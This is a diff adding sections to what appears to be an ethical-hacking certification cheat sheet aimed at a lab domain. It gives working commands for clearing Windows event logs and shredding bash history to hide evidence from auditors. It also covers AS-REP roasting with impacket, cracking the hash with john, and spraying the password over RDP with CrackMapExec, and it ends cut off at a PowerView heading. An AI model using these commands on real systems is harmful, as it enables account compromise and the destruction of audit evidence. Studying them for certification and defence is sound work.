@@ -859,4 +859,128 @@ msfconsole in another cmd
  set payload windows/meterpreter/reverse_tcp
  set lport and lhost the same which is given to registry payload
  restart the victim machine
+ ```
+ </details>
+ <details>
+ <summary>Clear Logs to Hide the Evidence</summary>
  
+ * Clear Windows Machine Logs using Various Utilities
+ ```console
+~$:download from file >> Clear_Event_Viewer_Logs.bat.
+runs automatically and closes it cleares all trackes
+```
+> manually clearing logs through cmd
+```console
+~$:run cmd with administrater privilage and run
+wevtutil el (shows all logs)
+to clear system logs
+wevtutil cl system (cl >> clear log)
+```
+> To hide the deleted file that auditor not to recover
+```console
+~$ cipher /w:[Drive or Folder or File Location]
+cipher /w:c
+>>it over writes the deleted file
+```
+* Clear Linux Machine Logs using the BASH Shell
+```console
+~$:export HISTSIZE=0 
+>>command to disable the BASH shell from saving the history.
+>>HISTSIZE: determines the number of commands to be saved, which will be set to 0.
+
+```
+```console
+~$: history -c
+clears the earlier used commands
+
+history -w 
+>> to delete the stored bash cmd 
+
+shred ~/.bash_history
+>>it will destroy the history
+
+more ~/.bash_history
+>> to view the shredded history
+```
+>we can perform all this bash clear in one single code
+```console
+~$shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.
+```
+</details>
+<details>
+<summary>Perform Active Directory (AD) Attacks</summary>
+
+* Perform Initial Scans to Obtain Domain Controller IP and Domain Name
+```console
+~$ nmap 10.10.1.0/24
+>>to scan entire subnet and to find domain controller ip 
+>>analyse the result that which ip having the LDAP 389/TCP and Kerberos 88/TCP port open that is over DC
+```
+```console
+~$: Now scanning 10.10.1.22 / DC machine in more depth
+nmap -A -sC -sV 10.10.1.22
+-A >> Agressisve
+_sC >> script (nmap script engine)
+-sV >> Version/service detection
+after this scan we can see domain name here its CEH.com
+```
+* Perform AS-REP Roasting Attack (to check which user dont enable DONT_REQUIRE_PREAUTH in DC)
+```console
+~$:cd to move into root
+cd impacket/examples/ 
+>> to get inside the directory
+python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
+
+>>GetNPUsers.py: Python script to retrieve AD user information.
+
+>>CEH.com/: Target AD domain.
+
+>>-no-pass: Flag to find user accounts not requiring pre-authentication.
+
+>>-usersfile ~/ADtools/users.txt: Path to the file with the user account list.
+
+>>-dc-ip 10.10.1.22: IP address of the DC to query.
+
+here we found user johua have this "DONT_REQUIRE_PREAUTH"
+```
+```console
+~$: copy the [hash]
+and
+echo '[HASH]' > joshuahash.txt. 
+to store hashes inside the text file
+```
+>then crack the password
+```console
+~$:  john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt.
+```
+</details>
+<details>
+<summary>Spray Cracked Password into Network using CrackMapExec</summary>
+
+* CrackMapExec (with nmap scanned services like ldap rdp ftp etc)
+```console
+~$:here we are taking rdp (remote desktop protocol)
+ cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+
+>>rdp: Targets the Remote Desktop Protocol (RDP) service.
+
+>>10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.
+
+>>-u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication.
+
+>>-p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts. 
+found here mark is pewned
+```
+```console
+~$: Remmina 
+>>after the above step of CME (getting of user and password)
+>>open Remmina in search bar in parrot os
+```
+</details>
+<details>
+<summary>Perform Post-Enumeration using PowerView</summary>
+
+* Powerview
+```console
+~$:
+
